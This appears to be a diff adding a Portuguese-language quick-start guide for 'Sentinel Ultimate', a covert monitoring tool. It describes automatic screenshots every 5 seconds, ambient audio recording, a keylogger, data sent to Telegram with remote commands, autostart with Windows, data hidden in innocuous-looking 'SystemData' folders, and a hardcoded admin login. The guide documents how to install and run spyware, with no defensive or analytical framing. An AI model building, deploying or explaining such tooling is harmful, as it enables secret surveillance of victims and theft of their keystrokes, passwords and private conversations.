@@ -1,0 +1,44 @@
+═══════════════════════════════════════════════════════════
+   SENTINEL ULTIMATE - GUIA RÁPIDO
+═══════════════════════════════════════════════════════════
+
+🔧 INSTALAÇÃO:
+1. Execute o arquivo "INSTALAR.bat" como administrador
+2. Aguarde a instalação das dependências
+3. Após concluir, execute: python sentinel_ultimate.py
+
+📱 ACESSO:
+- Abra o navegador e digite: http://127.0.0.1:8080
+- Login: admin
+- Senha: SpyWatdon3609
+
+⚡ FUNCIONALIDADES:
+- Screenshot automática a cada 5 segundos
+- Áudio ambiente a cada 10 segundos (volume máximo)
+- Keylogger que agrupa palavras completas
+- Painel web com layout horizontal
+- Exportação em PDF
+- Dados enviados para o Telegram
+- Inicia automaticamente com o Windows
+
+🤖 COMANDOS DO TELEGRAM:
+- /start - Inicia monitoramento
+- /stop - Pausa monitoramento
+- /status - Ver status
+- /screenshot - Capturar agora
+- /audio - Gravar áudio agora
+- /logs - Enviar log de teclas
+
+📁 ONDE FICAM OS DADOS:
+- Pasta oculta: SystemData/
+- Logs: SystemData/Logs/syslog.txt
+- Screenshots: SystemData/Cache/
+- Áudios: SystemData/Temp/
+
+⚠️ IMPORTANTE:
+- O programa fica em segundo plano
+- Inicia com o Windows automaticamente
+- Para encerrar: pressione CTRL+C no terminal
+
+Suporte: @sentinel_support
+═══════════════════════════════════════════════════════════
